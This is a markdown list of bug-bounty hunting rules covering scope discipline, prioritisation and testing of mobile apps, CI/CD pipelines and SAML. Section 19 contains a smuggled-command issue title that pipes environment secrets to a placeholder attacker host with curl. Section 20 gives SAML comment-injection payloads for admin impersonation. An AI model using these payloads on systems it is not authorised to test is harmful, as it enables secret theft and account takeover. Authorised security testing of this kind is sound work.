# Hunting Rules

These rules are always active. Breaking them wastes time and reduces payout rate.

---

## 1. READ FULL SCOPE FIRST

Before making a single request: read the program's in-scope and out-of-scope lists.
One out-of-scope request = potential ban. One out-of-scope report = instant close.

```
Read: every in-scope domain
Read: every out-of-scope exclusion
Read: excluded bug classes ("we do not pay for X")
Read: safe harbor clause
```

## 2. NEVER HUNT THEORETICAL BUGS

> "Can an attacker do this RIGHT NOW, against a real user, causing real harm?"
> If NO — STOP. Do not explore further. Do not write it up. Move on.

Theoretical bugs waste your time AND damage your validity ratio when submitted.

```
NOT a bug: "Could theoretically allow..."
NOT a bug: "Wrong but no practical impact"
NOT a bug: "3+ preconditions all simultaneously required"
NOT a bug: Dead/unreachable code
NOT a bug: SSRF with DNS callback only
```

## 3. KILL WEAK FINDINGS FAST

Run the 7-Question Gate BEFORE spending time on a finding. Kill at Q1 if needed.

Every minute on a weak finding = a minute not finding a real one.

## 4. CHECK SCOPE EXPLICITLY FOR EVERY ASSET

Not just "does this domain look like the target?" — verify it's on the scope list.
Check: Is it a third-party service they just use? Third-party = out of scope.

## 5. 5-MINUTE RULE

If a target surface shows nothing interesting after 5 minutes → move on.

Kill signals:
- All hosts return 403 or static pages
- No API endpoints with ID parameters
- No JavaScript bundles with interesting paths
- nuclei returns 0 medium/high findings

## 6. AUTOMATION = HIGHEST DUP RATE

Use automation for RECON only (subdomain enum, live hosts, URL crawl).
Manual testing finds unique bugs. Automated scanners find duplicates.

```
Automation: recon (subfinder, httpx, katana, nuclei)
Manual: IDOR testing, auth bypass, business logic, race conditions
```

## 7. IMPACT-FIRST HUNTING

Ask: "What's the worst thing that could happen if auth was broken here?"

If the answer is "nothing valuable" → skip the feature.
If the answer is "admin access, PII exfil, fund theft" → hunt there.

## 8. HUNT LESS-SATURATED BUG CLASSES

High competition (skip unless target-specific): XSS, SSRF basics, open redirect alone
Low competition: Cache poisoning, race conditions, business logic, HTTP smuggling, CI/CD

## 9. DEPTH OVER BREADTH

One target deeply understood > ten targets shallowly tested.

```
Read 5+ disclosed reports for the target before hunting
Understand the business domain
Map the crown jewels (what would hurt the company most?)
```

## 10. THE SIBLING RULE

> "Check EVERY sibling endpoint. If `/api/user/123/orders` requires auth,
> check `/api/user/123/export`, `/api/user/123/delete`, `/api/user/123/share`."

This rule explains 30% of all paid IDOR/auth bugs.

## 11. A→B SIGNAL METHOD

When you confirm bug A → stop → hunt for B and C before writing the report.

A confirmed bug = signal that the developer made a class of mistake.
They made it elsewhere too. Finding B costs 10x less than finding A.

Time-box: 20 minutes on B. If not confirmed → submit A and move on.

## 12. NEW == UNREVIEWED

Features < 30 days old have the lowest security maturity.
Monitor GitHub commits. Hunt new features first.

## 13. FOLLOW THE MONEY

Billing/credits/refunds/wallet = most developer shortcuts taken.
Price manipulation, race conditions on payment, quota bypass = high ROI.

## 14. 20-MINUTE ROTATION RULE

Every 20 min ask: "Am I making progress?"
No → rotate to next endpoint, subdomain, or vuln class.
Fresh context finds more bugs than brute force.

## 15. BUSINESS IMPACT > VULN CLASS

Clickjacking is usually $0 but MetaMask paid $120K for one.
Ask: "What's the business impact?" before estimating severity.

## 16. VALIDATE BEFORE WRITING

Run /validate before starting a report. Gate 0 is 30 seconds.
It takes 30 seconds to kill a bad lead. A report takes 30 minutes to write.

## 17. CREDENTIAL LEAKS NEED EXPLOITATION PROOF

Finding an API key = Informational.
Proving what the key accesses (S3 read, database, admin panel) = Medium/High.

Always call the API as the leaked key. Enumerate permissions.

## 18. MOBILE = DIFFERENT ATTACK SURFACE

Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
- Hardcoded secrets in `strings` output that web recon never finds
- API endpoints in decompiled source that aren't in the web JS
- Deep-link handlers with injection points
- WebView `addJavascriptInterface` = JS→Java bridge (RCE on API < 17)
- Certificate pinning bypass via Frida/objection → MitM all traffic

```bash
# Quick check without rooted device
apktool d target.apk -o target_src
grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer" target_src/ --include="*.smali" --include="*.xml"
grep -rn "https://" target_src/ | grep -v "schema\|xmlns\|android\|google" | head -50
```

## 19. CI/CD IS ATTACK SURFACE

GitHub Actions / GitLab CI pipelines often have critical secrets. Check BEFORE writing any report on a target with public repos.

```bash
# Clone target's public GitHub org repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request_target\|secrets\."

# Key dangerous patterns:
# 1. pull_request_target + checkout of PR branch = attacker code runs with repo secrets
# 2. ${{ github.event.issue.title }} in run: block = expression injection = secret exfil
# 3. artifact download without hash check = artifact poisoning
# 4. self-hosted runners = escape to org infrastructure
```

**Expression injection PoC (create an issue with this title):**
```
test"; curl https://ATTACKER.com/$(env | base64 -w0) #
```
If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).

## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY

SAML implementations are notoriously buggy. If target uses SSO, always test:
- XML signature wrapping (XSW) — valid signature, injected assertion
- Comment injection — `admin<!---->@company.com` = sign as admin
- XML external entity in SAML assertion
- Signature stripping (remove signature, server still accepts)
- NameID manipulation — change email in unsigned field

```bash
# Capture SAML assertion (base64 decode from SAMLResponse parameter)
echo "SAMLResponse_VALUE" | base64 -d | xmllint --format -

# Test comment injection in NameID
# Change: <NameID>user@company.com</NameID>
# To:     <NameID>admin<!---->@company.com</NameID>
# Or:     <NameID Format="...">admin@company.com</NameID> (duplicate element)
```

> SAML bugs frequently pay High–Critical because they enable SSO bypass across the entire platform.
